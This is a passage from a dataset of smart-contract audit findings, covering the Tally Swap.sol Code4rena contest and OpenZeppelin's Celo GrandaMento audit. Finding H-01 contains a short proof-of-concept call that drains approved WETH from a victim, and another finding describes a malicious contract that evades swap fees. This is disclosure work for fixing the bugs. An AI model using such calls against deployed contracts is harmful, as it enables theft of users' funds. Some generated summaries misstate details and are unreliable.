acknowledged](https://github.com/code-423n4/2021-10-tally-findings/issues/68#issuecomment-961245894):**\n > Still working through whether this is an issue we're truly worried about; in particular, if you want to do this, you probably might as well use the 0x API to swap directly.\n>\n> Nonetheless, it's overshadowed by #37, which will likely lead to changes that will make this impractical as well.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-10-tally-findings/issues/68#issuecomment-962451293):**\n > Downgrading to severity 2 as this would lead to \"leaked value\" as only the fees are lost by the protocol in this attack vector and customer assets aren't being stolen.\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a system that allows users to execute an ETH swap without paying swap fees for the ETH they receive. A malicious contract is deployed by the user, and when the system calls the contract's `fillZrxQuote` function, it returns 0 the first time and 1 the second time. This causes the system to think the user has executed an ERC20 swap, and the ETH they received from the swap is treated as \"refunded ETH\" and not charged any swap fees.\n\nThe impact of this vulnerability is that users can execute ETH swaps without paying any swap fees for the ETH they received. The bug was identified using manual code review, and the recommended mitigation steps are to either charge swap fees for the \"refunded ETH\" on ERC20 swaps, or require `boughtETHAmount == 0`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tally",
      "source_link": "https://code4rena.com/reports/2021-10-tally",
      "github_link": "https://github.com/code-423n4/2021-10-tally-findings/issues/68",
      "tags": [],
      "finders": [
        "pants"
      ]
    },
    {
      "id": "920",
      "title": "[M-02] Unused ERC20 tokens are not refunded",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\nBased on the context and comments in the code, we assume that it's possible that there will be some leftover sell tokens, not only when users are selling unwrapped ETH but also for ERC20 tokens.\n\nHowever, in the current implementation, only refunded ETH is returned (L158).\n\nBecause of this, the leftover tkoens may be left in the contract unintentionally.\n\n[`Swap.sol` L153-L181](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L153-L181)\n\n```solidity\nif (boughtERC20Amount > 0) {\n    // take the swap fee from the ERC20 proceeds and return the rest\n    uint256 toTransfer = SWAP_FEE_DIVISOR.sub(swapFee).mul(boughtERC20Amount).div(SWAP_FEE_DIVISOR);\n    IERC20(zrxBuyTokenAddress).safeTransfer(msg.sender, toTransfer);\n    // return any refunded ETH\n    payable(msg.sender).transfer(boughtETHAmount);\n\n    emit SwappedTokens(\n        zrxSellTokenAddress,\n        zrxBuyTokenAddress,\n        amountToSell,\n        boughtERC20Amount,\n        boughtERC20Amount.sub(toTransfer)\n    );\n} else {\n\n    // take the swap fee from the ETH proceeds and return the rest. Note\n    // that if any 0x protocol fee is refunded in ETH, it also suffers\n    // the swap fee tax\n    uint256 toTransfer = SWAP_FEE_DIVISOR.sub(swapFee).mul(boughtETHAmount).div(SWAP_FEE_DIVISOR);\n    payable(msg.sender).transfer(toTransfer);\n    emit SwappedTokens(\n        zrxSellTokenAddress,\n        zrxBuyTokenAddress,\n        amountToSell,\n        boughtETHAmount,\n        boughtETHAmount.sub(toTransfer)\n    );\n}\n```\n\n**[Shadowfiend (Tally) acknowledged](https://github.com/code-423n4/2021-10-tally-findings/issues/36#issuecomment-960119681):**\n > I believe the 0x API does in fact guarantee that we won't have any sell tokens left over, particularly since we intend to use RFQ-T for these quotes, but if not we will fix this... And we may make the change regardless to future-proof.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-10-tally-findings/issues/36#issuecomment-962450934):**\n > Downgrading to sev 2\n>\n> `\n> 2 â€” Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n>\n> As I believe this to be a \"leak value\" scenario.\n\n",
      "summary": "\nThe bug report revolves around the WatchPug vulnerability. It is assumed that there will be some leftover sell tokens when users are selling unwrapped ETH and ERC20 tokens. However, in the current implementation, only refunded ETH is returned. This means that the leftover tokens may be left in the contract unintentionally. The code snippet provided in the report illustrates the issue, as it shows that only ETH is returned while ERC20 tokens are not. To fix this issue, a code revision is necessary to ensure that the leftover tokens are returned to the user.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tally",
      "source_link": "https://code4rena.com/reports/2021-10-tally",
      "github_link": "https://github.com/code-423n4/2021-10-tally-findings/issues/36",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "919",
      "title": "[M-01] Swap.sol implements potentially dangerous transfer ",
      "impact": "MEDIUM",
      "content": "## Handle\n\nelprofesor\n\n\n## Vulnerability details\n\n## Impact\nThe use of `  .transfer()`  in `  Swap.sol`   may have unintended outcomes on the eth being sent to the receiver. Eth may be irretrievable or undelivered if the `msg.sender`   or `  feeRecipient`   is a smart contract. Funds can potentially be lost if;\n\n1. The smart contract fails to implement the payable fallback function \n2. The fallback function uses more than 2300 gas units\n\nThe latter situation may occur in the instance of gas cost changes. The impact would mean that any contracts receiving funds would potentially be unable to retrieve funds from the swap.\n\n## Proof of Concept\nThis issue directly impacts the following lines of code: [L257](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L257), [L173](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L173), [L158](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L158)\n\nExamples of similar issues ranked as medium can be found [here](https://github.com/code-423n4/2021-08-notional-findings/issues/15) and [here, just search for 'M04'](https://blog.openzeppelin.com/opyn-gamma-protocol-audit/). A detailed explanation of why relying on `payable().transfer()` may result in unexpected loss of eth can be found [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/)\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nRe-entrancy has been accounted for in all functions that reference `Solidity's  `  transfer() `  . This has been done by using a re-entrancy guard, therefore, we can rely on `  msg.sender.call.value(amount)`  or using the OpenZeppelin [Address.sendValue library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/utils/Address.sol#L63)",
      "summary": "\nThis bug report is about the unintended outcomes that may occur when using the `.transfer()` function in the `Swap.sol` contract. The impact of this issue is that any funds sent to a smart contract may be lost if the contract fails to implement the payable fallback function or if the fallback function uses more than 2300 gas units. The bug can be found in lines 257, 173, and 158 of the `Swap.sol` contract. Examples of similar issues can be found on Github and a detailed explanation of why relying on `payable().transfer()` may result in unexpected loss of ETH can be found on Consensys. The recommended mitigation step for this issue is to use a re-entrancy guard and the OpenZeppelin Address.sendValue library.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tally",
      "source_link": "https://code4rena.com/reports/2021-10-tally",
      "github_link": "https://github.com/code-423n4/2021-10-tally-findings/issues/20",
      "tags": [
        "call vs transfer"
      ],
      "finders": [
        "elprofesor",
        "JMukesh",
        "pauliax",
        "cmichel",
        "Koustre",
        "WatchPug"
      ]
    },
    {
      "id": "918",
      "title": "[H-02] Wrong calculation of erc20Delta and ethDelta",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L200-L225\n\n```solidity\nfunction fillZrxQuote(\n    IERC20 zrxBuyTokenAddress,\n    address payable zrxTo,\n    bytes calldata zrxData,\n    uint256 ethAmount\n) internal returns (uint256, uint256) {\n    uint256 originalERC20Balance = 0;\n    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {\n        originalERC20Balance = zrxBuyTokenAddress.balanceOf(address(this));\n    }\n    uint256 originalETHBalance = address(this).balance;\n\n    (bool success,) = zrxTo.call{value: ethAmount}(zrxData);\n    require(success, \"Swap::fillZrxQuote: Failed to fill quote\");\n\n    uint256 ethDelta = address(this).balance.subOrZero(originalETHBalance);\n    uint256 erc20Delta;\n    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {\n        erc20Delta = zrxBuyTokenAddress.balanceOf(address(this)).subOrZero(originalERC20Balance);\n        require(erc20Delta > 0, \"Swap::fillZrxQuote: Didn't receive bought token\");\n    } else {\n        require(ethDelta > 0, \"Swap::fillZrxQuote: Didn't receive bought ETH\");\n    }\n\n    return (erc20Delta, ethDelta);\n}\n```\n\nWhen a user tries to swap unwrapped ETH to ERC20, even if there is a certain amount of ETH refunded, at L215, `ethDelta` will always be `0`. \n\nThat's because `originalETHBalance` already includes the `msg.value` sent by the caller.\n\nLet's say the ETH balance of the contract is `1 ETH` before the swap.\n\n- A user swaps `10 ETH` to USDC;\n- `originalETHBalance` will be `11 ETH`;\n- If there is `1 ETH` of refund;\n- `ethDelta` will be `0` as the new balance is `2 ETH` and `subOrZero(2, 11)` is `0`.\n\nSimilarly, `erc20Delta` is also computed wrong.\n\nConsider a special case of a user trying to arbitrage from `WBTC` to `WBTC`, the `originalERC20Balance` already includes the input amount, `erc20Delta` will always be much lower than the actual delta amount.\n\nFor example, for an arb swap from `1 WBTC` to `1.1 WBTC`, the `ethDelta` will be `0.1 WBTC` while it should be `1.1 WBTC`.\n\n### Impact\n\n- User can not get ETH refund for swaps from ETH to ERC20 tokens;\n- Arb swap with the same input and output token will suffer the loss of almost all of their input amount unexpectedly.\n\n### Recommendation\n\nConsider subtracting the input amount from the originalBalance.",
      "summary": "\nThis bug report is about a vulnerability in the WatchPug smart contract code. When a user tries to swap unwrapped ETH to ERC20, even if there is a certain amount of ETH refunded, the `ethDelta` and `erc20Delta` values will always be `0`. This is because the `originalETHBalance` and `originalERC20Balance` already include the `msg.value` sent by the caller. As a result, users cannot get ETH refund for swaps from ETH to ERC20 tokens and arb swap with the same input and output token will suffer the loss of almost all of their input amount unexpectedly. The recommendation is to consider subtracting the input amount from the originalBalance.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tally",
      "source_link": "https://code4rena.com/reports/2021-10-tally",
      "github_link": "https://github.com/code-423n4/2021-10-tally-findings/issues/34",
      "tags": [],
      "finders": [
        "WatchPug",
        "harleythedog"
      ]
    },
    {
      "id": "917",
      "title": "[H-01] Arbitrary contract call allows attackers to steal ERC20 from usersâ€™ wallets",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L200-L212\n\n```solidity\nfunction fillZrxQuote(\n    IERC20 zrxBuyTokenAddress,\n    address payable zrxTo,\n    bytes calldata zrxData,\n    uint256 ethAmount\n) internal returns (uint256, uint256) {\n    uint256 originalERC20Balance = 0;\n    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {\n        originalERC20Balance = zrxBuyTokenAddress.balanceOf(address(this));\n    }\n    uint256 originalETHBalance = address(this).balance;\n\n    (bool success,) = zrxTo.call{value: ethAmount}(zrxData);\n```\n\nA call to an arbitrary contract with custom calldata is made in `fillZrxQuote()`, which means the contract can be an ERC20 token, and the calldata can be `transferFrom` a previously approved user.\n\n### Impact\n\nThe wallet balances (for the amount up to the allowance limit) of the tokens that users approved to the contract can be stolen.\n\n### PoC\n\nGiven:\n\n- Alice has approved 1000 WETH to `Swap.sol`;\n\nThe attacker can:\n\n```\nTallySwap.swapByQuote(\n    address(WETH),\n    0,\n    address(WETH),\n    0,\n    address(0),\n    address(WETH),\n    abi.encodeWithSignature(\n        \"transferFrom(address,address,uint256)\",\n        address(Alice),\n        address(this),\n        1000 ether\n    )\n)\n```\n\nAs a result, 1000 WETH will be stolen from Alice and sent to the attacker.\n\nThis PoC has been tested on a forking network.\n\n### Recommendation\n\nConsider adding a whitelist for `zrxTo` addresses.",
      "summary": "\nA bug has been discovered in the Swap.sol contract, which is part of the Tally project. The bug allows attackers to steal wallet balances from users who have approved tokens to the contract. Through a proof of concept, it has been demonstrated that attackers can use the 'fillZrxQuote' function to call an arbitrary contract with custom calldata, and transfer funds from the user to the attacker. This is done by having the user approve tokens to the contract, and then calling the 'transferFrom' function with the attacker as the recipient. The impact of this vulnerability is that wallet balances can be stolen from users who have approved tokens to the contract, up to their allowance limit. \n\nA recommendation to mitigate this vulnerability is to add a whitelist for 'zrxTo' addresses, which would limit the addresses that can be called with the 'fillZrxQuote' function. This would help prevent malicious actors from exploiting this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tally",
      "source_link": "https://code4rena.com/reports/2021-10-tally",
      "github_link": "https://github.com/code-423n4/2021-10-tally-findings/issues/37",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "10833",
      "title": "[L07] No checks in setVetoPeriodSeconds",
      "impact": "LOW",
      "content": "The [`setVetoPeriodSeconds` function](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L604-L606) contains no checks on what value `vetoPeriodSeconds` can be set to.\n\n\nThe purpose of the veto period is to [ensure community approval before executing a proposal](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L341-L343). A proposal cannot be executed until the veto period has passed.\n\n\nIn the case that the veto period is `0` or too small, there will not be enough time for the community to veto malicious proposals before they are executed. In the event that the veto period is too high, proposals will be forced to wait potentially indefinitely long before being able to be excuted. This also has the effect of locking exchanger funds in the protocol, as exchangers are [not able to cancel proposals once approved](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L313-L316) and thus release their funds.\n\n\nConsider setting reasonable bounds for the veto period. The veto periodâ€™s lower bound should be long enough that interested users are able to learn about and discuss the proposal, as well as get their transactions mined during periods of high network congestion. The veto periodâ€™s upper bound should be short enough that an exchangerâ€™s funds cannot be locked in the protocol for too long, in the case that their proposal is approved.\n\n\n***Update:** Fixed in [pull request #8368](https://github.com/celo-org/celo-monorepo/pull/8368/files). A maximum bound has been added for the veto period.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit â€“ Release 5",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-granda-mento/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10832",
      "title": "[L06] No checks in setMaxApprovalExchangeRateChange",
      "impact": "LOW",
      "content": "Within the [function `setMaxApprovalExchangeRateChange`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L556), there are no checks on acceptable values for [`maxApprovalExchangeRateChange`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L560).\n\n\nIn the proposal approval process, the [`rateChange`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L290) variable represents a percentage difference between the proposed exchange rate and the current exchange rate. Then, the `rateChange` [must be less than the `maxApprovalExchangeRateChange`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L291-L293). If `maxApprovalExchangeRateChange` is too low, it is highly likely that proposal approvals will revert.\n\n\nConsider setting a lower bound for `maxApprovalExchangeRateChange` within `setMaxApprovalExchangeRateChange` to prevent excessive reversions during the proposal approval process.\n\n\n***Update:** Acknowledged, will not be fixed. The cLabs teamâ€™s statement for this issue:*\n\n\n\n> After discussion, decided to be a wontfix. While the value of maxApprovalExchangeRateChange is critical to not be too low, we believe Governance is capable of picking a reasonable value, and hardcoding a minimum doesnâ€™t help much. For example, a hardcoded minimum of 1% doesnâ€™t do a whole lot, and a higher value of 10% would paralyze the flexibility Governance has in restricting proposals easily.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit â€“ Release 5",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-granda-mento/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10831",
      "title": "[L05] Be careful of noncompliant ERC20â€™s",
      "impact": "LOW",
      "content": "Within the [`GrandaMento` contract](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol), there are uses of the ERC20 `transfer` function on line [324](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L324) and line [354](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L354). There is also an instance of the `transferFrom` function [on line 235](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L235). These instances are within `require`s and will revert if the call to `transfer` does not return `true`.\n\n\nAlthough all current stable tokens, as well as the native asset CELO, do return `true` on a successful transfer, it is a common pattern within DeFi that some tokens do not return `true`. Thus, GrandaMento will not work for these tokens.\n\n\nAdditionally, any non-standard tokens which charge fees on transfer may not be accounted correctly, due to not checking the contractâ€™s balance post-transfer.\n\n\nConsider checking for ERC20 compliance before allowing a token to be used with GrandaMento. Additionally, consider modifying the logic in GrandaMento to account for tokens which may charge fees by checking the change in the GrandaMento contractâ€™s balance before and after transfer.\n\n\n***Update:** Acknowledged. The cLabs teamâ€™s statement for this issue:*\n\n\n\n> It is presumed that the only ERC-20 tokens that will be allowed in Granda Mento are core Celo stable tokens that are based on StableToken.sol and approved by Governance. Thereâ€™s no general way to determine ERC-20 compliance on-chain, this needs to be done by humans off-chain and approved via a Governance vote.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit â€“ Release 5",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-granda-mento/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10830",
      "title": "[L04] Approved proposals may be executed at any time",
      "impact": "LOW",
      "content": "After a proposal reaches the `Approved` stage, it can be executed [at any time after the â€œveto periodâ€ ends](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L341-L343). However, note that proposals do not expire. Thus, a proposal can lay dormant after the veto period until it is profitable to perform it.\n\n\nThis issue is of low severity due to a few factors which hinder itâ€™s probability. The first is that a proposal may also be [cancelled at any time after it is approved](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L315). Another factor is that [anyone can execute a proposal](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L332) once it is approved.\n\n\nWe mention this issue to make it clear to users that dormant proposals can lead to abuse. In the event that the network is experiencing high congestion, it may seem like a waste to approve or cancel a proposal due to high fees. However, it should be made clear that dormant proposals being executed at rates that differ substantially from current price of CELO can destabilize markets and drain the Celo reserves. Consider informing users, and perhaps establishing a proposal expiry time, after which approved proposals can no longer be executed.\n\n\n***Update:** Acknowledged, will not fix. The cLabs teamâ€™s statement for this issue:*\n\n\n\n> After brief discussion, we think this is worth informing users (both exchangers & community members) this can happen, but wonâ€™t make any smart contract changes to implement an expiry (so essentially a wontfix). We believe that adding an expiry could leave the exchanger with more opportunity for malfeasance. If the price of the asset being bought has fallen drastically since the locked-in price, an exchanger could intentionally try their best to have the proposal expire so it no longer has a â€œlosingâ€ trade. Regardless, we expect usage of GrandaMento to be infrequent & high visibility, so itâ€™s likely that exchanges would be executed quickly when possible.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit â€“ Release 5",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-granda-mento/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10829",
      "title": "[L03] Proposal might suffer compounded loss when cancelled",
      "impact": "LOW",
      "content": "When cancelling a proposal, the [`cancelExchangeProposal`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L308) function calls [`getSellTokenAndSellAmount`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L384)to return the target token and token amount for the refund. In [L408](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L408) of `getSellTokenAndSellAmount`, a mechanism is implemented to cap the returned value to the balance of GrandaMento contract in case the conversion from units to value for stable token ends up bigger than the contract balance.\n\n\nHowever if there are multiple proposals being cancelled, the design of this mechanism will compound the potential loss to the very last proposal. Although the value is unlikely to be significant, the design seems inconsiderate.\n\n\nConsider changing the design to better handle potential conversion loss. For instance, consider using an accounting system which only depends on â€œunitsâ€ rather than â€œvalueâ€, thus avoiding imprecision from conversions.\n\n\n***Update:** Acknowledged. The cLabs teamâ€™s statement for this issue:*\n\n\n\n> If there are any imprecisions, they are likely going to be on the order of fractions of a cUSD, whereas Granda Mento transfers are expected to be on the order of hundreds of thousands/millions cUSD.  \n> \n> Due to StableTokenâ€™s inflation mechanism, thereâ€™s no way to transact directly in units, a(n inherently imprecise) conversion to value is necessary.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit â€“ Release 5",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-granda-mento/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10828",
      "title": "[L02] Exchanger cancellations can be front-run",
      "impact": "LOW",
      "content": "When a proposal is created in GrandaMento.sol, it can only be cancelled before it is approved by the approver role by calling the [`cancelExchangeProposal`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L308) function. However this process can be front-run by the approver role, who can [approve](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L276) the proposal and prevent the user from cancelling it.\n\n\nConsider informing exchangers that this is possible. Consider giving proposals a grace period in which the exchangers can cancel them before the approver can approve them.\n\n\n***Update:** Acknowledged and fixed in [issue #8328](https://github.com/celo-org/celo-monorepo/issues/8328). The cLabs team has determined that informing exchangers of this possibility is sufficient.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit â€“ Release 5",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-granda-mento/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10827",
      "title": "[L01] Changing veto period can affect existing proposals",
      "impact": "LOW",
      "content": "The GrandaMento.sol contract introduced a [Veto Period](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L119) as a time buffer between a proposalâ€™s approval and execution. This concept is critial from a proposerâ€™s point of view and should not be changed after a proposal is proposed. However, the contract owner can update this value at anytime by calling the function [`setVetoPeriodSeconds`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L604) which will lead to a change of veto period for all existing proposals including the ones approved. This could put existing proposals in a less preferable position, particularly the ones already approved since anyone can execute these proposals under a new veto period.\n\n\nConsidering baking the veto period into the proposal once it is created so it is not affected by future veto updates.\n\n\n***Update:** Fixed in [pull request #8369](https://github.com/celo-org/celo-monorepo/pull/8369/files).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit â€“ Release 5",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-granda-mento/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10826",
      "title": "[H01] Large stablecoin amounts may get stuck",
      "impact": "HIGH",
      "content": "Within the flow of executing or cancelling a proposal to sell a stablecoin for CELO, the [`getSellTokenAndSellAmount`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L384) function is used to call the stable tokenâ€™s [`unitsToValue`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L399) function to convert the underlying stored number of â€œunitsâ€ of stable token to a â€œvalueâ€ of the stable token. This mechanism exists so that stored funds in the GrandaMento contract experience inflation as they wait for their respective proposals to be executed.\n\n\nHowever, when dealing with large amounts of stable token, which is what GrandaMento is intended for, the `unitsToValue` function may overflow. The [calculation in `unitsToValue`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/stability/StableToken.sol#L435) utilizes the â€œinflation factorâ€, which is currently `1e24` (see [function `getInflationParameters` in the cUSD contract](https://explorer.celo.org/tokens/0x765DE816845861e75A25fCA122bb6898B8B1282a/read-contract)). It also casts the `units` parameter to `newFixed`, which [multiplies it by `FIXED1_UINT`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/common/FixidityLib.sol#L83), where [`FIXED1_UINT` is also `1e24`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/common/FixidityLib.sol#L29). Finally, the `divide` function also used in the calculation multiplies the already scaled value by [an additional `1e24`](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/common/FixidityLib.sol#L245). This final multiplication, within the `divide` function, may potentially cause the calculation to [overflow and revert](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/common/FixidityLib.sol#L246).\n\n\nConsider the case where a user is attempting to execute a sale of 200 billion cUSD for CELO. When the `unitsToValue` function is hit, the `units` will be on the order of `200000000000*1e18`, or `2e29`. Then, casting it to `newFixed` will make the value `2e29*1e24`, or `2e53`. Then, within the `divide` function, the value will be again multiplied by `1e24`, bringing it to `2e77`. The maximum value of a `uint256` is roughly `1.158e77`, so this value of `2e77` will overflow, causing the [overflow check in `divide` to be triggered](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/common/FixidityLib.sol#L246).\n\n\nNote that this issue becomes more likely when considering the [CXOF token](https://explorer.celo.org/tokens/0x832F03bCeE999a577cb592948983E35C048B5Aa4/token-transfers), which also has 18 decimals but is worth roughly 1/500 of cUSD. Thus, 200 billion CXOF is roughly 400 million cUSD, a much more likely number to be exchanged. This issue may worsen as currencies worth substantially less than 1 USD are added. For example, the Vietnamese Dong is worth roughly 1/23000 USD, so roughly 5 million USD worth would trigger the overflow.\n\n\nNote also that as the inflation factor increases over time, this issue becomes slightly more likely.\n\n\nFinally, note that this issue does not exist for creating a proposal, as proposal creation [utilizes the `valueToUnits` function](https://github.com/celo-org/celo-monorepo/blob/d06617c7f4e59f643a0a0120e5501bcf762f1a7d/packages/protocol/contracts/liquidity/GrandaMento.sol#L246). This is the crux of the issue, which is that funds will be locked inside the GrandaMento contract in the event a user attempts to exchange too much. This applies both when attempting to execute a proposal, and when attempting to cancel it.\n\n\nConsider paying close attention to these limits when setting maximum exchange amounts, and warning users that if they attempt to exchange too much, their funds may be locked in the GrandaMento contract. We understand that inflation is currently not being applied to stablecoins, but in the event that it is in the future, any limits set here should be re-evaluated for long term health of GrandaMento.\n\n\n***Update:** Fixed in [pull request #8500](https://github.com/celo-org/celo-monorepo/pull/8500/files).*",
